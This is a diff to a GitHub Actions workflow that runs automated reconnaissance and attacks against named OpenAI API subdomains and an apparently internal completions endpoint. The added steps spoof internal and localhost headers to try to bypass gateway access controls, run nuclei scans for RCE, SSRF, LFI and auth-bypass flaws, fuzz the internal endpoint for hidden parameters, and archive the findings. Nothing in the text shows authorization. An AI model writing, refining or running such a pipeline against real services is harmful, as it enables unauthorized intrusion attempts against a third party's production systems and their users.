@@ -15,13 +15,12 @@ jobs:
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          go install -v github.com/lc/gau/v2/cmd/gau@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
       - name: Phase 1:High-Value Target Injection
         run: |
-          # We are hard-coding the 'Gold Mine' subdomains discovered in your logs
+          # We focus on the 'Unified' and 'Internal' endpoints you discovered
           cat <<EOF > targets.txt
           admin.unified-8.api.openai.com
           chat-onramp.unified-5.api.openai.com
@@ -29,28 +28,26 @@ jobs:
           unified-79.api.openai.com
           api.openai.com/v1/completionsinternal
           EOF
-          
-          # Discovering live endpoints and status codes for these specific targets
           httpx -l targets.txt -silent -sc -title -o live_targets.txt
 
-      - name: Phase 2:Deep Vulnerability Mining (High CVE Focus)
+      - name: Phase 2:Active Path Fuzzing & Bypass Testing
         run: |
-          # Katana with custom headers to test for Gateway Bypasses
-          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 -H "X-Forwarded-For: 127.0.0.1" -o all_endpoints.txt
-          
-          # Filtering for the most critical attack surfaces
-          grep -E "admin|auth|internal|config|v1" all_endpoints.txt > critical_paths.txt || true
+          # We use Katana to find hidden paths on those 404/403 endpoints
+          # We inject 'internal' headers to see if the 404 turns into a 200
+          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 \
+          -H "X-OpenAI-Internal: true" \
+          -H "X-Forwarded-For: 127.0.0.1" \
+          -o all_endpoints.txt
 
-      - name: Phase 3:Automated Exploitation (Nuclei & Arjun)
+      - name: Phase 3:Targeted CVE & Logic Scan
         run: |
-          # 1. Nuclei: Targeting High/Critical CVEs specifically (Bypasses, RCE, Exposures)
-          # These tags cover recent 2024-2025 critical vulnerability patterns
-          nuclei -l critical_paths.txt -tags cve,rce,auth-bypass,exposure,takeover -severity critical,high -rl 5 -o nuclei_results.txt || true
+          # 1. Nuclei: Testing for SSRF, RCE, and Auth Bypass CVEs
+          # We use specific tags for API vulnerabilities (CVE-2024-XXXX patterns)
+          nuclei -l all_endpoints.txt -tags cve,ssrf,rce,auth-bypass,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true
           
-          # 2. Arjun: Fuzzing for hidden parameters that grant higher privileges
-          head -n 5 critical_paths.txt | while read -r url; do
-             arjun -u "$url" --rate-limit 2 -oJ "params_$(date +%s).json" || true
-          done
+          # 2. Arjun: Fuzzing the 'completionsinternal' for hidden required parameters
+          # Often a 404 is returned if a 'required' parameter is missing
+          arjun -u "https://api.openai.com/v1/completionsinternal" --rate-limit 2 -oJ "internal_params.json" || true
 
       - name: Archive Critical Evidence
         uses: actions/upload-artifact@v4
@@ -58,6 +55,6 @@ jobs:
           name: openai-high-cve-results
           path: |
             nuclei_results.txt
-            critical_paths.txt
-            params_*.json
+            all_endpoints.txt
+            internal_params.json
             
